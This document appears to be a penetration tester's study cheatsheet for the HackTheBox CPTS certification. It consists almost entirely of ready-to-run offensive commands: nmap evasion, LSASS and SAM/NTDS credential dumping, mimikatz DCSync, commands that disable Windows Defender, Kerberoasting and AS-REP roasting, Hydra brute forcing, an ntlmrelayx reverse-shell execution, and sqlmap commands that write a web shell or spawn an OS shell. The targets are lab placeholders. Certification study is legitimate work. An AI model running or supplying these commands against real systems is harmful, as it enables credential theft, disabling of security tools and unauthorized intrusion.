# CPTS - Cheatsheet

> HackTheBox Certified Penetration Tester Specialist Cheatsheet

## Tmux
### Shorcuts

Start a new tmux session
- `tmux new -s <name>`

Start a new session or attach to an existing session named mysession
- `tmux new-session -A -s <name>`

List all sessions
- `tmux ls`

Kill/delete session
- `tmux kill-session -t <name>`

Kill all sessions but current
- `tmux kill-session -a`

Attach to last session
- `tmux a`
- `tmux a -t <name>`

Start/stop logging with tmux logger
- `prefix + [Shift + P]`

Split tmux pane vertically
- `prefix + [Shift + %]`

Split tmux pane horizontally
- `prefix + [Shift + "]`

Switch between tmux panes
- `prefix + [Shift + O]`

## NMAP
### Nmap address scanning

Scan a single IP
- `nmap 192.168.1.1`

Scan multiple IPs
- `nmap 192.168.1.1 192.168.1.2`

Scan a range
- `nmap 192.168.1.1-254`

Scan a subnet
- `nmap 192.168.1.0/24`
### Nmap scanning techniques

TCP SYN port scan (Default)
- `nmap -sS 192.168.1.1`

TCP connect port scan (Default without root privilege)
- `nmap -sT 192.168.1.1`

UDP port scan
- `nmap -sU 192.168.1.1`

TCP ACK port scan
- `nmap -sA 192.168.1.1`
### Nmap Host Discovery

Disable port scanning. Host discovery only.
- `nmap -sn 192.168.1.1`

Disable host discovery. Port scan only.
- `nmap -Pn 192.168.1.1`

Never do DNS resolution
- `nmap -n 192.168.1.1`
### Nmap port scan

Port scan from service name
- `nmap 192.168.1.1 -p http, https`

Specific port scan
- `nmap 192.168.1.1 -p 80,9001,22`

All ports
- `nmap 192.168.1.1 -p-`

Fast scan 100 ports
- `nmap -F 192.168.1.1`

Scan top ports
- `nmap 192.168.1.1 -top-ports 200`
### Nmap OS and service detection

Aggressive scanning (Bad Opsec). Enables OS detection, version detection, script scanning, and traceroute.
- `nmap -A 192.168.1.1`

Version detection scanning
- `nmap -sV 192.168.1.1`

Version detection intensity from 0-9
- `nmap -sV -version-intensity 7 192.168.1.1`

OS detection
- `nmap -O 192.168.1.1`

Hard OS detection intensity
- `nmap -O -osscan-guess 192.168.1.1`

### Nmap timing and performance

Paranoid (0) Intrusion Detection System evasion. This option sends packets no faster than one per 5 minutes, making it extremely slow but very stealthy.

- `nmap 192.168.1.1 -T0`

Insane (5) speeds scan; assumes you are on an extraordinarily fast network. This is the fastest timing option, but it is also the most likely to be detected.

- `nmap 192.168.1.1 -T5`

Send packets no slower than <number> per second. This option allows you to specify the maximum number of packets per second to send.

- `nmap 192.168.1.1 --min-rate 1000`
### NSE Scripts

Scan with a single script. Example banner. This option allows you to specify a single script to run against the target.

- `nmap 192.168.1.1 --script=banner`

NSE script with arguments. This option allows you to specify a script and pass arguments to it.

NSE script with arguments
- `nmap 192.168.1.1 --script=banner --script-args <arguments>`
### Firewall Evasion and Spoofing

Requested scan (including ping scans) use tiny fragmented IP packets. Harder for packet filters
- `nmap -f 192.168.1.1`

Set your own offset size(8, 16, 32, 64)
- `nmap 192.168.1.1 --mtu 32`

Send scans from spoofed IPs
- `nmap 192.168.1.1 -D 192.168.1.11,192.168.1.12,192.168.1.13,192.168.1.13`
### Output

Normal output to the file normal.file
- `nmap 192.168.1.1 -oN scan.txt`

Output in the three major formats at once
- `nmap 192.168.1.1 -oA scan`

## Footprinting Services

### FTP

Connect to FTP
- `ftp <IP>`

Interact with a service on the target
- `nc -nv <IP> <PORT>`

Download all available files on the target FTP server
- `wget -m --no-passive ftp://anonymous:anonymous@<IP>`
### SMB

Connect to a specific SMB share
- `smbclient //<FQDN IP>/<share>`

Interaction with the target using RPC
- `rpcclient -U "" <FQDN IP>`

Enumerating SMB shares using null session authentication
- `crackmapexec smb <FQDN/IP> --shares -u '' -p '' --shares`
### NFS

Show available NFS shares
- `showmount -e <IP>`

Mount the specific NFS share
- `mount -t nfs <FQDN/IP>:/<share> ./target-NFS/ -o nolock`

Unmount the NFS share when done
- `umount ./target-NFS`
### DNS

NS request to the specific nameserver
- `dig ns <domain.tld> @<nameserver>`

ANY request to the specific nameserver
- `dig any <domain.tld> @<nameserver>`

AXFR request to the specific nameserver
- `dig axfr <domain.tld> @<nameserver>`
### IMAP POP3

Log in to the IMAPS service using cURL
- `curl -k 'imaps://<FQDN/IP>' --user <user>:<password>`

Connect to the IMAPS service
- `openssl s_client -connect <FQDN/IP>:imaps`

Connect to the POP3s service
- `openssl s_client -connect <FQDN/IP>:pop3s`
### SNMP

Querying OIDs using snmpwalk
- `snmpwalk -v2c -c <community string> <FQDN/IP>`

Bruteforcing community strings of the SNMP service
- `onesixtyone -c community-strings.list <FQDN/IP>`

Bruteforcing SNMP service OIDs
- `braa <community string>@<FQDN/IP>:.1.*`
### MSSQL

Connect to MSSQL server with Windows authentication
- `impacket-mssqlclient <user>@<FQDN/IP> -windows-auth`
### IPMI

IPMI version detection using Metasploit
- `msf6 auxiliary(scanner/ipmi/ipmi_version)`

Dump IPMI hashes using Metasploit
- `msf6 auxiliary(scanner/ipmi/ipmi_dumphashes)`
### Linux Remote Management SSH

Enforce password-based authentication
- `ssh <user>@<FQDN/IP> -o PreferredAuthentications=password`

## Password Attacks

### Password Mutations

Generate a wordlist based on keywords from a website using cewl
- `cewl https://www.inlanefreight.com -d 4 -m 6 --lowercase -w inlane.wordlist`

Generate a rule-based wordlist with Hashcat
- `hashcat --force password.list -r custom.rule --stdout > mut_password.list`

Generate usernames from first and last names using username-anarchy
- `./username-anarchy -i /path/to/listoffirstandlastnames.txt`
### Remote Password Attacks

Crack passwords using Hydra with user and password lists
- `hydra -L user.list -P password.list <service>://<ip>`

Perform credential stuffing with Hydra using a credentials file
- `hydra -C <user_pass.list> ssh://<IP>`

Dump SAM hashes over the network with CrackMapExec
- `crackmapexec smb <ip> --local-auth -u <username> -p <password> --sam`

Dump LSA secrets (may contain clear-text credentials)
- `crackmapexec smb <ip> --local-auth -u <username> -p <password> --lsa`

Dump NTDS hashes over the network
- `crackmapexec smb <ip> -u <username> -p <password> --ntds`
### Windows Password Attacks

Search for "password" in various file types
- `findstr /SIM /C:"password" *.txt *.ini *.cfg *.config *.xml *.git *.ps1 *.yml`

Display LSASS process information
- `Get-Process lsass`

Create an LSASS memory dump
- `rundll32 C:\windows\system32\comsvcs.dll, MiniDump 672 C:\lsass.dmp full`

Extract credentials from LSASS dump with Pypykatz
- `pypykatz lsa minidump /path/to/lsassdumpfile`

Save registry hives (SAM, SECURITY, SYSTEM)
- `reg.exe save hklm\sam C:\sam.save`
- `reg.exe save hklm\security C:\security.save`
- `reg.exe save hklm\system C:\system.save`

Transfer files over the network
- `move sam.save \\<ip>\NameofFileShare`

Copy NTDS.dit from volume shadow copy
- `cmd.exe /c copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy2\Windows\NTDS\NTDS.dit c:\NTDS\NTDS.dit`
### Linux Password Attacks

Find configuration files on a Linux system
```bash
for l in $(echo ".conf .config .cnf");do 
  echo -e "\nFile extension: " $l; 
  find / -name *$l 2>/dev/null | grep -v "lib|fonts|share|core";
done
```

Search for credentials in configuration files
```bash
for i in $(find / -name *.cnf 2>/dev/null | grep -v "doc|lib");do 
  echo -e "\nFile: " $i; 
  grep "user|password|pass" $i 2>/dev/null | grep -v "\#";
done
```

Find database files
```bash
for l in $(echo ".sql .db .*db .db*");do 
  echo -e "\nDB File extension: " $l; 
  find / -name *$l 2>/dev/null | grep -v "doc|lib|headers|share|man";
done
```

Search for text files in home directories
- `find /home/* -type f -name "*.txt" -o ! -name "*.*"`

Find SSH private keys
- `grep -rnw "PRIVATE KEY" / 2>/dev/null | grep ":1"`
### Cracking Passwords

Crack NTLM hash with Hashcat
- `hashcat -m 1000 64f12cddaa88057e06a81b54e73b949b /usr/share/wordlists/rockyou.txt --show`

Crack PDF hash with John the Ripper
- `john --wordlist=rockyou.txt pdf.hash`

Combine passwd and shadow files for cracking
- `unshadow /tmp/passwd.bak /tmp/shadow.bak > /tmp/unshadowed.hashes`

Crack unshadowed hashes with Hashcat
- `hashcat -m 1800 -a 0 /tmp/unshadowed.hashes rockyou.txt -o /tmp/unshadowed.cracked`

Extract hash from protected Office document
- `office2john.py Protected.docx > protected-docx.hash`

## Attacking Common Services

### Attacking SMB

Network share enumeration using smbmap
- `smbmap -H 10.129.14.128`

Null-session with rpcclient
- `rpcclient -U'%' 10.10.110.17`

Execute command over SMB using crackmapexec
- `crackmapexec smb 10.10.110.17 -u Administrator -p 'Password123!' -x 'whoami' --exec-method smbexec`

Extract hashes from SAM database
- `crackmapexec smb 10.10.110.17 -u administrator -p 'Password123!' --sam`

Dump SAM database using impacket-ntlmrelayx
- `impacket-ntlmrelayx --no-http-server -smb2support -t 10.10.110.146`

Execute PowerShell reverse shell using impacket-ntlmrelayx
- `impacket-ntlmrelayx --no-http-server -smb2support -t 192.168.220.146 -c 'powershell -e <base64 reverse shell>'`
### Attacking SQL

Enable xp_cmdshell in SQL Server
```sql
EXECUTE sp_configure 'show advanced options', 1
EXECUTE sp_configure 'xp_cmdshell', 1
RECONFIGURE
xp_cmdshell 'whoami'
```

Steal NTLM hashes using xp_dirtree
- `EXEC master..xp_dirtree '\\10.10.110.17\share\'`

Steal NTLM hashes using xp_subdirs
- `EXEC master..xp_subdirs '\\10.10.110.17\share\'`

Identify SQL Server user and privileges
- `EXECUTE('select @@servername, @@version, system_user, is_srvrolemender(''sysadmin'')') AT [10.0.0.12\SQLEXPRESS]`
### Attacking Email Services

DNS lookup for mail servers
- `host -t MX microsoft.com`
- `dig mx inlanefreight.com | grep "MX" | grep -v ";"`

DNS lookup for mail server IP
- `host -t A mail1.inlanefreight.htb.`

Connect to SMTP server
- `telnet 10.10.110.20 25`

SMTP user enumeration with RCPT
- `smtp-user-enum -M RCPT -U userlist.txt -D inlanefreight.htb -t 10.129.203.7`

Brute-force POP3 service
- `hydra -L users.txt -p 'Company01!' -f 10.10.110.20 pop3`

Test SMTP open relay
- `swaks --from notifications@inlanefreight.com --to employees@inlanefreight.com --header 'Subject: Notification' --body 'Message' --server 10.10.11.213`

## Active Directory

### Initial Enumeration

Perform a ping sweep on a network segment
- `fping -asgq 172.16.5.0/23`

Enumerate domain users with Kerbrute
- `./kerbrute_linux_amd64 userenum -d INLANEFREIGHT.LOCAL --dc 172.16.5.5 jsmith.txt -o kerb-results`

### LLMNR Poisoning

Crack NTLMv2 hashes captured by Responder
- `hashcat -m 5600 frond_ntlmv2 /usr/share/wordlists/rockyou.txt -o found.txt`

### Password Spraying and Password Policies

Extract password policy
- `crackmapexec smb 172.16.5.5 -u avazquez -p Password123 --pass-pol`

Perform a password spraying attack
- `Invoke-DomainPasswordSpray -Password Welcome1 -OutFile spray_success -ErrorAction SilentlyContinue`

### Enumerating and Bypassing AV

Check if Defender is enabled
- `Get-MpComputerStatus`
- `Get-MpComputerStatus | Select AntivirusEnabled`

Disable real-time monitoring
- `Set-MpPreference -DisableRealtimeMonitoring $true`

Disable IOAV protection
- `Set-MpPreference -DisableIOAVProtection $true`

Disable behavior monitoring
- `Set-MPPreference -DisableBehaviourMonitoring $true`

Disable block at first seen
- `Set-MPPreference -DisableBlockAtFirstSeen $true`

Disable email scanning
- `Set-MPPreference -DisableEmailScanning $true`

Disable script scanning
- `Set-MPPReference -DisableScriptScanning $true`

Exclude files by extension
- `Set-MpPreference -ExclusionExtension "ps1"`

Turn off everything and set exclusion to "C:\Windows\Temp"
- `Set-MpPreference -DisableRealtimeMonitoring $true;Set-MpPreference -DisableIOAVProtection $true;Set-MPPreference -DisableBehaviorMonitoring $true;Set-MPPreference -DisableBlockAtFirstSeen $true;Set-MPPreference -DisableEmailScanning $true;Set-MPPReference -DisableScriptScanning $true;Set-MpPreference -DisableIOAVProtection $true;Add-MpPreference -ExclusionPath "C:\Windows\Temp"`

### Living Of The Land

List all available modules
- `Get-Module`

Load the Active Directory PowerShell module
- `Import-Module ActiveDirectory`

Gather Windows domain information
- `Get-ADDomain`

Enumerate user accounts with ServicePrincipalName
- `Get-ADUser -Filter {ServicePrincipalName -ne "$null"} -Properties ServicePrincipalName`

Enumerate trust relationships
- `Get-ADTrust -Filter * | select name`

Enumerate members of a specific group
- `Get-ADGroupMember -Identity "Backup Operators"`

### Kerberoasting

Download/request a TGS ticket for a specific user account
- `impacket-GetUserSPNs -dc-ip 172.16.5.5 INLANEFREIGHT.LOCAL/mholliday -request-user sqldev -outputfile sqldev_tgs`

Crack Kerberos ticket hash
- `hashcat -m 13100 sqldev_tgs /usr/share/wordlists/rockyou.txt --force`

### ACL Enumeration and Tactics

Find object ACLs with modification rights
- `Find-InterestingDomainAcl`

Change the password of a specific user
- `Set-DomainUserPassword -Identity damundsen -AccountPassword $damundsenPassword -Credential $Cred -Verbose`

Add a user to a specific security group
- `Add-DomainGroupMember -Identity 'Help Desk Level 1' -Members 'damundsen' -Credential $Cred2 -Verbose`

View the members of a specific security group
- `Get-DomainGroupMember -Identity "Help Desk Level 1" | Select MemberName`

Create a fake Service Principal Name
- `Set-DomainObject -Credential $Cred2 -Identity adunn -SET @{serviceprincipalname='notahacker/LEGIT'} -Verbose`

### DCSync Attack

View the group membership of a specific user
- `Get-DomainUser -Identity adunn | select samaccountname,objectsid,memberof,useraccountcontrol |fl`

Perform a dcsync attack
- `mimikatz # lsadump::dcsync /domain:INLANEFREIGHT.LOCAL /user:INLANEFREIGHT\administrator`

### Miscellanous Configurations

Enumerate a Windows target for MS-PRN Printer bug
- `Get-SpoolStatus -ComputerName ACADEMY-EA-DC01.INLANEFREIGHT.LOCAL`

Display the description field of select objects
- `Get-DomainUser * | Select-Object samaccountname,description`

Check for the PASSWD_NOTREQD setting
- `Get-DomainUser -UACFilter PASSWD_NOTREQD | Select-Object samaccountname,useraccountcontrol`

### ASREPRoasting

Search for the DONT_REQ_PREAUTH value
- `Get-DomainUser -PreauthNotRequired | select samaccountname,userprincipalname,useraccountcontrol | fl`

Perform an ASREP Roasting attack
- `.\Rubeus.exe asreproast /user:mmorgan /nowrap /format:hashcat`

Crack the captured hash
- `hashcat -m 18200 ilfreight_asrep /usr/share/wordlists/rockyou.txt`

Enumerate users and retrieve the AS for any users found
- `kerbrute userenum -d inlanefreight.local --dc 172.16.5.5 /opt/jsmith.txt`

### Trust Relationships Child Parent Trusts

Enumerate a target Windows domain's trust relationships
- `Get-ADTrust -Filter *`

Enumerate a target Windows domain's trust relationships
- `Get-DomainTrust`

Perform a domain trust mapping
- `Get-DomainTrustMapping`

### Trust Relationships - Cross-Forest

Enumerate accounts for associated SPNs
- `Get-DomainUser -SPN -Domain FREIGHTLOGISTICS.LOCAL | select SamAccountName`

Enumerate the mssqlsvc account
- `Get-DomainUser -Domain FREIGHTLOGISTICS.LOCAL -Identity mssqlsvc | select samaccountname,memberof`

Enumerate groups with users that do not belong to the domain
- `Get-DomainForeignGroupMember -Domain FREIGHTLOGISTICS.LOCAL`
```

## Login Brute Forcing

### Hydra

Basic authentication brute force with wordlists
- `hydra -L wordlist.txt -P wordlist.txt -u -f SERVER_IP -s PORT http-get /`

Login form brute force with static username and password wordlist
- `hydra -l admin -P wordlist.txt -f SERVER_IP -s PORT http-post-form "/login.php:username=^USER^&password=^PASS^:F=<form name='login'>"`
### SQLMap
```
# Run SQLMap without asking for user input
sqlmap -u "http://www.example.com/vuln.php?id=1" --batch

# SQLMap with POST request specifying an unjection point with asterisk
sqlmap 'http://www.example.com/' --data 'uid=1*&name=test'

# Passing an HTTP request file to SQLMap
sqlmap -r req.txt

# Specifying a PUT request
sqlmap -u www.target.com --data='id=1' --method PUT

# Specifying a prefix or suffix
sqlmap -u "www.example.com/?q=test" --prefix="%'))" --suffix="-- -"

# Basic DB enumeration
sqlmap -u "http://www.example.com/?id=1" --banner --current-user --current-db --is-dba

# Table enumeration
sqlmap -u "http://www.example.com/?id=1" --tables -D testdb

# Table row enumeration
sqlmap -u "http://www.example.com/?id=1" --dump -T users -D testdb -C name,surname

# Conditional enumeration
sqlmap -u "http://www.example.com/?id=1" --dump -T users -D testdb --where="name LIKE 'f%'"

# CSRF token bypass
sqlmap -u "http://www.example.com/" --data="id=1&csrf-token=WfF1szMUHhiokx9AHFply5L2xAOfjRkE" --csrf-token="csrf-token"

# List all tamper scripts
sqlmap --list-tampers

# Writing a file
sqlmap -u "http://www.example.com/?id=1" --file-write "shell.php" --file-dest "/var/www/html/shell.php"

# Spawn a shell
sqlmap -u "http://www.example.com/?id=1" --os-shell
```
## Useful Resources
- [HackTriks](https://book.hacktricks.xyz/)
- [WADCOMS](https://wadcoms.github.io/#+SMB+Windows)
- [GTFOBins](https://gtfobins.github.io/)
- [SwissKeyRepo - Payload All The Things](https://github.com/swisskyrepo/PayloadsAllTheThings)
- [Living Of The Land Binaries and Scripts for Windows](https://lolbas-project.github.io/#)
- [Active Directory MindMap](https://orange-cyberdefense.github.io/ocd-mindmaps/)
- [Precompiled .NET Binaries](https://github.com/jakobfriedl/precompiled-binaries)
